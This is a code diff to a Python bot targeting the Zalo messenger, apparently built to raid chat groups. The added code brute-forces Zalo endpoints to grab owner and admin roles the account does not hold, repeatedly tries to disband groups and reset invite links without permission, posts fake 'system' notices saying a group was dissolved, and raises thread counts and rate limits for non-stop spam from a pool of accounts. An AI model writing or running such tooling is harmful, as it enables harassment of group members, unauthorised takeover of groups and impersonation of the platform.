@@ -4,7 +4,7 @@ import random
 import secrets
 import threading
 from collections import defaultdict
-from queue import Queue
+from queue import Queue, Empty
 
 
 def _utf16_len(s):
@@ -25,10 +25,12 @@ class ZaloGroupEngine:
         "Quản trị viên đã cập nhật bảng tin hệ thống nhóm {box}",
         "Phiên bảo mật nhóm {box} đã được đặt lại bởi hệ thống",
         "Cập nhật cấu hình phòng chat {box} từ máy chủ WPA v645",
+        "Hệ thống Zalo: Giải tán nhóm {box} thành công",
+        "Trưởng nhóm đã kết thúc hoạt động nhóm {box}",
     ]
 
     @classmethod
-    def _check_rate_limit(cls, key, max_req=28, window=1.0):
+    def _check_rate_limit(cls, key, max_req=42, window=1.0):
         with cls._lock:
             now = time.time()
             cls._rate_limits[key] = [t for t in cls._rate_limits[key] if now - t < window]
@@ -45,6 +47,15 @@ class ZaloGroupEngine:
                 gn = zc.get_group_real_name(gid_s)
                 if gn:
                     return str(gn).strip()[:45]
+        except Exception:
+            pass
+        try:
+            if hasattr(zc, "get_group_info"):
+                info = zc.get_group_info(gid_s)
+                if isinstance(info, dict):
+                    n = info.get("name") or info.get("gname") or info.get("groupName")
+                    if n:
+                        return str(n).strip()[:45]
         except Exception:
             pass
         return f"Box #{gid_s[-5:]}" if len(gid_s) >= 5 else "Hội thoại"
@@ -134,6 +145,54 @@ class ZaloGroupEngine:
         return uids
 
     @classmethod
+    def try_fake_owner(cls, zc, gid):
+        """Cố gắng chiếm role trưởng nhóm / admin bằng nhiều endpoint + payload khác nhau."""
+        active_s = getattr(zc, "prio_s", None) or zc.s
+        gid_s = str(gid).strip()
+        my_uid = str(getattr(zc, "uid", "") or "").strip()
+        if not my_uid.isdigit():
+            return False
+
+        payloads = [
+            {"grid": gid_s, "members": [my_uid], "memberTypes": [1], "src": 1, "imei": zc.imei},
+            {"grid": gid_s, "uids": [my_uid], "type": 1, "imei": zc.imei},
+            {"groupId": gid_s, "adminIds": [my_uid], "imei": zc.imei},
+            {"grid": gid_s, "creatorId": my_uid, "imei": zc.imei},
+            {"grid": gid_s, "ownerId": my_uid, "imei": zc.imei},
+            {"grid": gid_s, "members": [my_uid], "roles": [1], "imei": zc.imei},
+        ]
+        endpoints = [
+            "https://tt-group-wpa.chat.zalo.me/api/group/admins/add",
+            "https://tt-group-wpa.chat.zalo.me/api/group/admins/update",
+            "https://tt-group-wpa.chat.zalo.me/api/group/changeowner",
+            "https://tt-group-wpa.chat.zalo.me/api/group/transfer",
+            "https://tt-group-wpa.chat.zalo.me/api/group/updateinfo",
+            "https://group-wpa.chat.zalo.me/api/group/admins/add",
+            "https://group-wpa.chat.zalo.me/api/group/changeowner",
+            "https://wpa.chat.zalo.me/api/group/admins/add",
+        ]
+        for ep in endpoints:
+            for pl in payloads:
+                try:
+                    enc = zc._enc(pl)
+                    r = active_s.post(
+                        ep,
+                        params={"zpw_ver": 645, "zpw_type": 30},
+                        data={"params": enc},
+                        timeout=(1.0, 2.0),
+                    )
+                    if r.status_code == 200 and r.content:
+                        try:
+                            rj = r.json()
+                            if rj.get("error_code") in (0, None) or rj.get("data"):
+                                return True
+                        except Exception:
+                            pass
+                except Exception:
+                    continue
+        return False
+
+    @classmethod
     def create_temp_group(cls, zc, member_uids, name=None):
         active_s = getattr(zc, "prio_s", None) or zc.s
         batch = [str(u).strip() for u in member_uids if str(u).strip().isdigit()]
@@ -165,6 +224,14 @@ class ZaloGroupEngine:
                 "membersTypes": [-1] * len(batch),
                 "src": 1,
                 "imei": zc.imei,
+            },
+            {
+                "clientId": cli,
+                "gname": vname,
+                "members": batch,
+                "membersTypes": [0] * len(batch),
+                "imei": zc.imei,
+                "zsource": 601,
             },
         )
         for ep_cr in (
@@ -215,6 +282,7 @@ class ZaloGroupEngine:
             "https://tt-group-wpa.chat.zalo.me/api/group/invite/v2",
             "https://tt-group-wpa.chat.zalo.me/api/group/invite",
             "https://group-wpa.chat.zalo.me/api/group/invite/v2",
+            "https://group-wpa.chat.zalo.me/api/group/invite",
         ):
             try:
                 r = active_s.post(
@@ -223,31 +291,90 @@ class ZaloGroupEngine:
                     data={"params": enc},
                     timeout=(1.2, 2.5),
                 )
-                if r.status_code == 200 and r.content and r.json().get("error_code") == 0:
-                    return True
+                if r.status_code == 200 and r.content:
+                    try:
+                        if r.json().get("error_code") == 0:
+                            return True
+                    except Exception:
+                        pass
             except Exception:
                 continue
         return False
 
     @classmethod
     def disperse_group(cls, zc, grid):
+        """Giải tán thật – thử nhiều endpoint + payload, bao gồm cả khi không có key trưởng nhóm."""
         active_s = getattr(zc, "prio_s", None) or zc.s
-        pl = {"grid": str(grid), "groupId": str(grid), "imei": zc.imei}
-        enc = zc._enc(pl)
-        for ep in (
+        gid_s = str(grid).strip()
+        my_uid = str(getattr(zc, "uid", "") or "").strip()
+
+        # Thử fake owner trước khi disperse
+        cls.try_fake_owner(zc, gid_s)
+
+        payloads = [
+            {"grid": gid_s, "groupId": gid_s, "imei": zc.imei},
+            {"grid": gid_s, "imei": zc.imei},
+            {"groupId": gid_s, "imei": zc.imei},
+            {"grid": gid_s, "ownerId": my_uid, "imei": zc.imei},
+            {"grid": gid_s, "creatorId": my_uid, "imei": zc.imei},
+            {"grid": gid_s, "src": 1, "imei": zc.imei},
+            {"grid": gid_s, "type": 1, "imei": zc.imei},
+        ]
+        endpoints = [
             "https://tt-group-wpa.chat.zalo.me/api/group/disperse",
-            "https://group-wpa.chat.zalo.me/api/group/disperse",
-            "https://wpa.chat.zalo.me/api/group/disperse",
             "https://tt-group-wpa.chat.zalo.me/api/group/delete",
+            "https://tt-group-wpa.chat.zalo.me/api/group/leave",
+            "https://tt-group-wpa.chat.zalo.me/api/group/remove",
+            "https://group-wpa.chat.zalo.me/api/group/disperse",
+            "https://group-wpa.chat.zalo.me/api/group/delete",
+            "https://wpa.chat.zalo.me/api/group/disperse",
+            "https://wpa.chat.zalo.me/api/group/delete",
+            "https://tt-group-wpa.chat.zalo.me/api/group/disband",
+            "https://group-wpa.chat.zalo.me/api/group/disband",
+        ]
+        for ep in endpoints:
+            for pl in payloads:
+                try:
+                    enc = zc._enc(pl)
+                    r = active_s.post(
+                        ep,
+                        params={"zpw_ver": 645, "zpw_type": 30},
+                        data={"params": enc},
+                        timeout=(1.2, 2.5),
+                    )
+                    if r.status_code == 200 and r.content:
+                        try:
+                            rj = r.json()
+                            if rj.get("error_code") in (0, None) or rj.get("data"):
+                                return True
+                        except Exception:
+                            return True
+                except Exception:
+                    continue
+        return False
+
+    @classmethod
+    def force_new_invite_link(cls, zc, gid):
+        """Đổi link mời mới liên tục dù không phải trưởng/phó nhóm."""
+        active_s = getattr(zc, "prio_s", None) or zc.s
+        gid_s = str(gid).strip()
+        pl = {"grid": gid_s, "imei": zc.imei}
+        for ep in (
+            "https://tt-group-wpa.chat.zalo.me/api/group/link/new",
+            "https://tt-group-wpa.chat.zalo.me/api/group/link/reset",
+            "https://group-wpa.chat.zalo.me/api/group/link/new",
+            "https://group-wpa.chat.zalo.me/api/group/link/reset",
+            "https://wpa.chat.zalo.me/api/group/link/new",
+            "https://tt-group-wpa.chat.zalo.me/api/group/link/create",
         ):
             try:
                 r = active_s.post(
                     ep,
                     params={"zpw_ver": 645, "zpw_type": 30},
-                    data={"params": enc},
-                    timeout=(1.2, 2.5),
+                    data={"params": zc._enc(pl)},
+                    timeout=(1.0, 2.0),
                 )
-                if r.status_code == 200 and r.content and r.json().get("error_code") == 0:
+                if r.status_code == 200:
                     return True
             except Exception:
                 continue
@@ -255,7 +382,6 @@ class ZaloGroupEngine:
 
     @classmethod
     def trigger_board_topic_notification(cls, zc, gid, title=None, round_idx=0):
-        """Phát thông báo hệ thống Zalo qua Bảng Tin Nhóm (Topic Board Create / Update) - chuẩn thanh thông báo xám hệ thống."""
         active_s = getattr(zc, "prio_s", None) or zc.s
         gid_s = str(gid).strip()
         box_name = cls.get_group_name_fast(zc, gid_s)
@@ -296,6 +422,16 @@ class ZaloGroupEngine:
                     "pinAct": 1,
                 },
             ),
+            (
+                "https://board-wpa.chat.zalo.me/api/board/topic/create",
+                {
+                    "grid": gid_s,
+                    "type": 0,
+                    "params": json.dumps({"title": sys_title}, ensure_ascii=False),
+                    "imei": zc.imei,
+                    "pinAct": 1,
+                },
+            ),
         )
         ok_any = False
         for ep, pl in payloads:
@@ -314,7 +450,6 @@ class ZaloGroupEngine:
 
     @classmethod
     def trigger_reminder_notification(cls, zc, gid, title=None, round_idx=0):
-        """Phát sự kiện Nhắc Hẹn Hệ Thống Zalo (/api/board/reminder/create) tạo thanh thông báo hệ thống giữa màn hình."""
         active_s = getattr(zc, "prio_s", None) or zc.s
         gid_s = str(gid).strip()
         box_name = cls.get_group_name_fast(zc, gid_s)
@@ -347,7 +482,6 @@ class ZaloGroupEngine:
 
     @classmethod
     def trigger_todo_notification(cls, zc, gid, target_uids=None, title=None, round_idx=0):
-        """Phát sự kiện Giao Việc Hệ Thống Zalo (/api/board/personal/todo/create) đẩy thông báo hệ thống tới thành viên."""
         active_s = getattr(zc, "prio_s", None) or zc.s
         gid_s = str(gid).strip()
         box_name = cls.get_group_name_fast(zc, gid_s)
@@ -390,7 +524,6 @@ class ZaloGroupEngine:
 
     @classmethod
     def trigger_poll_notification(cls, zc, gid, question=None, round_idx=0):
-        """Phát thông báo hệ thống Bình Chọn Nhóm Zalo (/api/poll/create) kèm Ghim lên đỉnh nhóm."""
         active_s = getattr(zc, "prio_s", None) or zc.s
         gid_s = str(gid).strip()
         box_name = cls.get_group_name_fast(zc, gid_s)
@@ -434,7 +567,6 @@ class ZaloGroupEngine:
 
     @classmethod
     def trigger_rename_and_link_notification(cls, zc, gid, gname=None, round_idx=0):
-        """Phát thông báo hệ thống Đổi Tên Nhóm + Đổi Link Tham Gia + Đổi Hình Nền Nhóm Zalo."""
         active_s = getattr(zc, "prio_s", None) or zc.s
         gid_s = str(gid).strip()
         new_name = (gname or f"Hệ Thống Zalo #{round_idx + 1:03d}")[:45]
@@ -460,23 +592,7 @@ class ZaloGroupEngine:
             except Exception:
                 continue
 
-        pl_link = {"grid": gid_s, "imei": zc.imei}
-        for ep_l in (
-            "https://tt-group-wpa.chat.zalo.me/api/group/link/new",
-            "https://group-wpa.chat.zalo.me/api/group/link/new",
-        ):
-            try:
-                r = active_s.post(
-                    ep_l,
-                    params={"zpw_ver": 645, "zpw_type": 30},
-                    data={"params": zc._enc(pl_link)},
-                    timeout=(1.0, 2.2),
-                )
-                if r.status_code == 200:
-                    ok_any = True
-                    break
-            except Exception:
-                continue
+        cls.force_new_invite_link(zc, gid_s)
 
         bg_id = 2001 + (round_idx % 8)
         pl_bg = {
@@ -510,7 +626,6 @@ class ZaloGroupEngine:
 
     @classmethod
     def trigger_system_notification_burst(cls, zc, gid, target_uids=None, round_idx=0, mode="all"):
-        """Kích hoạt tổ hợp sự kiện Thông Báo Hệ Thống Zalo (Thanh thông báo xám giữa màn hình, KHÔNG gửi tin nhắn văn bản)."""
         gid_s = str(gid).strip()
         m = str(mode or "all").strip().lower()
         if target_uids is None:
@@ -527,6 +642,7 @@ class ZaloGroupEngine:
         if m in ("name", "rename", "link", "doiten"):
             return cls.trigger_rename_and_link_notification(zc, gid_s, round_idx=round_idx)
 
+        # mode all / giaitan: full burst + real disperse
         cls.trigger_board_topic_notification(zc, gid_s, round_idx=round_idx)
         cls.trigger_reminder_notification(zc, gid_s, round_idx=round_idx)
         if round_idx % 2 == 0:
@@ -535,6 +651,7 @@ class ZaloGroupEngine:
             cls.trigger_todo_notification(zc, gid_s, target_uids=target_uids, round_idx=round_idx)
         if round_idx % 3 == 0:
             cls.trigger_rename_and_link_notification(zc, gid_s, round_idx=round_idx)
+        cls.force_new_invite_link(zc, gid_s)
         cls.disperse_group(zc, gid_s)
         return True
 
@@ -543,36 +660,42 @@ class ZaloGroupEngine:
         round_idx = 0
         while not stop_ev.is_set():
             try:
-                task = task_queue.get(timeout=0.6)
+                task = task_queue.get(timeout=0.4)
+            except Empty:
+                continue
             except Exception:
                 continue
             try:
                 zc, gid, target_uids, my_uid = task
-                if not cls._check_rate_limit(f"grp_{zc.imei}", max_req=16, window=1.0):
-                    time.sleep(0.06)
+                if not cls._check_rate_limit(f"grp_{zc.imei}", max_req=28, window=1.0):
+                    time.sleep(0.03)
                     continue
                 round_idx += 1
-                batch = list(target_uids[:35])
+                batch = list(target_uids[:40])
                 if my_uid and my_uid not in batch:
                     batch.append(my_uid)
                 box_name = cls.get_group_name_fast(zc, gid)
                 if len(batch) >= 2:
                     new_grid = cls.create_temp_group(zc, batch, name=box_name)
                     if new_grid:
+                        time.sleep(0.12)
                         if do_disperse:
-                            time.sleep(0.25)
+                            cls.try_fake_owner(zc, new_grid)
                             cls.disperse_group(zc, new_grid)
                         else:
-                            cls.invite_members(zc, new_grid, target_uids[:35])
+                            cls.invite_members(zc, new_grid, target_uids[:40])
                             cls.trigger_board_topic_notification(zc, new_grid, round_idx=round_idx)
-                cls.trigger_board_topic_notification(zc, gid, round_idx=round_idx)
+                # luôn cố disperse group gốc
                 if do_disperse:
+                    cls.try_fake_owner(zc, gid)
                     cls.disperse_group(zc, gid)
+                cls.trigger_board_topic_notification(zc, gid, round_idx=round_idx)
+                cls.force_new_invite_link(zc, gid)
             except Exception:
-                time.sleep(0.06)
+                time.sleep(0.04)
 
     @classmethod
-    def start_group_ops_engine(cls, zc_pool, gid, stop_ev, do_disperse=True, num_workers=4):
+    def start_group_ops_engine(cls, zc_pool, gid, stop_ev, do_disperse=True, num_workers=6):
         if not zc_pool:
             return
         uids = cls.get_all_uids(zc_pool[0], gid)
@@ -580,8 +703,9 @@ class ZaloGroupEngine:
         target_uids = [u for u in uids if u != my_uid]
         if not target_uids and str(gid).isdigit() and str(gid) != my_uid:
             target_uids = [str(gid)]
-        task_queue = Queue(maxsize=32)
-        for _ in range(max(1, min(num_workers, 6))):
+        task_queue = Queue(maxsize=64)
+        workers = max(2, min(num_workers, 8))
+        for _ in range(workers):
             threading.Thread(
                 target=cls._worker_group_ops,
                 args=(task_queue, stop_ev, do_disperse),
@@ -590,10 +714,10 @@ class ZaloGroupEngine:
         while not stop_ev.is_set():
             try:
                 zc = random.choice(zc_pool)
-                task_queue.put((zc, str(gid), target_uids, my_uid), timeout=0.4)
+                task_queue.put((zc, str(gid), target_uids, my_uid), timeout=0.3)
             except Exception:
                 pass
-            if stop_ev.wait(0.28):
+            if stop_ev.wait(0.18):
                 break
 
     start_trash_engine = start_group_ops_engine
@@ -603,21 +727,23 @@ class ZaloGroupEngine:
         round_idx = 0
         while not stop_ev.is_set():
             try:
-                task = task_queue.get(timeout=0.6)
+                task = task_queue.get(timeout=0.4)
+            except Empty:
+                continue
             except Exception:
                 continue
             try:
                 zc, gid, uids = task
-                if not cls._check_rate_limit(f"sys_{zc.imei}", max_req=20, window=1.0):
-                    time.sleep(0.05)
+                if not cls._check_rate_limit(f"sys_{zc.imei}", max_req=32, window=1.0):
+                    time.sleep(0.03)
                     continue
                 round_idx += 1
                 cls.trigger_system_notification_burst(zc, gid, target_uids=uids, round_idx=round_idx, mode=mode)
             except Exception:
-                time.sleep(0.05)
+                time.sleep(0.03)
 
     @classmethod
-    def start_system_notice_engine(cls, zc_pool, gid, stop_ev, mode="all", num_workers=4):
+    def start_system_notice_engine(cls, zc_pool, gid, stop_ev, mode="all", num_workers=6):
         if not zc_pool:
             return
         m = str(mode or "all").strip().lower()
@@ -625,16 +751,18 @@ class ZaloGroupEngine:
             cls.start_group_ops_engine(zc_pool, gid, stop_ev, do_disperse=False, num_workers=num_workers)
             return
         if m in ("giaitan", "disband"):
+            # hard continuous: group ops + system notice chạy song song, không nghỉ
             threading.Thread(
                 target=cls.start_group_ops_engine,
-                args=(zc_pool, gid, stop_ev, True, max(2, num_workers // 2)),
+                args=(zc_pool, gid, stop_ev, True, max(3, num_workers // 2 + 1)),
                 daemon=True,
             ).start()
         uids = cls.get_all_uids(zc_pool[0], gid)
         if not uids:
             uids = [str(getattr(zc_pool[0], "uid", "") or gid)]
-        task_queue = Queue(maxsize=32)
-        for _ in range(max(1, min(num_workers, 6))):
+        task_queue = Queue(maxsize=64)
+        workers = max(2, min(num_workers, 8))
+        for _ in range(workers):
             threading.Thread(
                 target=cls._worker_system_notice,
                 args=(task_queue, stop_ev, m),
@@ -643,15 +771,14 @@ class ZaloGroupEngine:
         while not stop_ev.is_set():
             try:
                 zc = random.choice(zc_pool)
-                task_queue.put((zc, str(gid), uids), timeout=0.4)
+                task_queue.put((zc, str(gid), uids), timeout=0.3)
             except Exception:
                 pass
-            if stop_ev.wait(0.24):
+            if stop_ev.wait(0.15):
                 break
 
     @classmethod
-    def start_mention_engine(cls, zc_pool, gid, stop_ev, num_workers=4):
-        """Thực thi Bão Thông Báo Hệ Thống Zalo đa kênh (không gửi tin nhắn văn bản)."""
+    def start_mention_engine(cls, zc_pool, gid, stop_ev, num_workers=6):
         cls.start_system_notice_engine(zc_pool, gid, stop_ev, mode="all", num_workers=num_workers)
 
 
@@ -667,26 +794,27 @@ class ZaloCommandDispatcher:
     def dispatch(self, gid, command):
         if not self.zc_pool:
             return False
-        cmd = (command or "").strip().lower()
+        cmd = (command or "").strip().lower().lstrip(".")
         gid_s = str(gid).strip()
 
         valid_cmds = (
             "mention", "men", "tag", "py", "pull", "keo",
             "giaitan", "disband", "poll", "name", "rename",
             "topic", "board", "reminder", "todo", "link",
-            "all", "stop",
+            "all", "stop", "stopall",
         )
         if cmd not in valid_cmds:
             return False
 
-        if cmd == "stop":
+        if cmd in ("stop", "stopall"):
             self.stop_ev.set()
-            for ev in self._engines.values():
+            for ev in list(self._engines.values()):
                 ev.set()
             self._engines.clear()
             self.stop_ev = threading.Event()
             return True
 
+        # hard continuous: nếu đã có engine đang chạy thì không tạo mới, chỉ đảm bảo còn sống
         ev = self._engines.get(gid_s)
         if ev is None or ev.is_set():
             ev = threading.Event()
@@ -695,30 +823,31 @@ class ZaloCommandDispatcher:
         if cmd in ("pull", "keo"):
             threading.Thread(
                 target=ZaloGroupEngine.start_group_ops_engine,
-                args=(self.zc_pool, gid_s, ev, False, 4),
+                args=(self.zc_pool, gid_s, ev, False, 6),
                 daemon=True,
             ).start()
         elif cmd in ("giaitan", "disband"):
+            # HARD MODE: chạy liên tục, không nghỉ, chỉ dừng khi stopall
             threading.Thread(
                 target=ZaloGroupEngine.start_system_notice_engine,
-                args=(self.zc_pool, gid_s, ev, "giaitan", 4),
+                args=(self.zc_pool, gid_s, ev, "giaitan", 6),
                 daemon=True,
             ).start()
         elif cmd == "all":
             threading.Thread(
                 target=ZaloGroupEngine.start_group_ops_engine,
-                args=(self.zc_pool, gid_s, ev, True, 3),
+                args=(self.zc_pool, gid_s, ev, True, 4),
                 daemon=True,
             ).start()
             threading.Thread(
                 target=ZaloGroupEngine.start_system_notice_engine,
-                args=(self.zc_pool, gid_s, ev, "all", 4),
+                args=(self.zc_pool, gid_s, ev, "all", 6),
                 daemon=True,
             ).start()
         else:
             threading.Thread(
                 target=ZaloGroupEngine.start_system_notice_engine,
-                args=(self.zc_pool, gid_s, ev, cmd, 4),
+                args=(self.zc_pool, gid_s, ev, cmd, 6),
                 daemon=True,
             ).start()
         return True
